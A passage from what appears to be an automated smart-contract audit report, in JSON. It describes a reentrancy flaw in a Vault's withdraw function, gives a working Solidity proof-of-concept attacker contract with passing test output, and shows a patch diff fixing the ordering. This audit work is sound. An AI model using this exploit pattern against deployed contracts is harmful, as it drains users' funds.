        "function": "withdraw",
        "description": "withdraw() sends ETH before updating balances[msg.sender], so a contract can re-enter withdraw() and drain the vault.",
        "attack": "Deposit 1 ETH, call withdraw(1 ether); in receive() call withdraw again while balances is not yet decremented.",
        "confidence": 0.9
      },
      "citations": [],
      "poc": {
        "confirmed": true,
        "attempts": 1,
        "test_file": "test/Exploit_F1.t.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\nimport \"forge-std/Test.sol\";\nimport \"../src/Vault.sol\";\n\ncontract Attacker {\n    Vault v;\n    constructor(Vault _v) { v = _v; }\n    function attack() external payable {\n        v.deposit{value: 1 ether}();\n        v.withdraw(1 ether);\n    }\n    receive() external payable {\n        if (address(v).balance >= 1 ether) v.withdraw(1 ether);\n    }\n}\n\ncontract ExploitF1 is Test {\n    function test_exploit() public {\n        Vault v = new Vault();\n        vm.deal(address(0xB0B), 10 ether);\n        vm.prank(address(0xB0B));\n        v.deposit{value: 10 ether}();\n        Attacker a = new Attacker(v);\n        vm.deal(address(a), 1 ether);\n        a.attack{value: 0}();\n        assertGt(address(a).balance, 1 ether);\n    }\n}\n",
        "output": "[PASS] ExploitF1.test_exploit()",
        "note": ""
      },
      "patch": {
        "applied": true,
        "attempts": 1,
        "diff": "--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -11,11 +11,9 @@\n \n     function withdraw(uint256 amount) external {\n         require(balances[msg.sender] >= amount, \"insufficient\");\n+        balances[msg.sender] -= amount;\n         (bool ok,) = msg.sender.call{value: amount}(\"\");\n         require(ok, \"transfer failed\");\n-        unchecked {\n-            balances[msg.sender] -= amount;\n-        }\n     }\n \n     function totalAssets() external view returns (uint256) {\n",
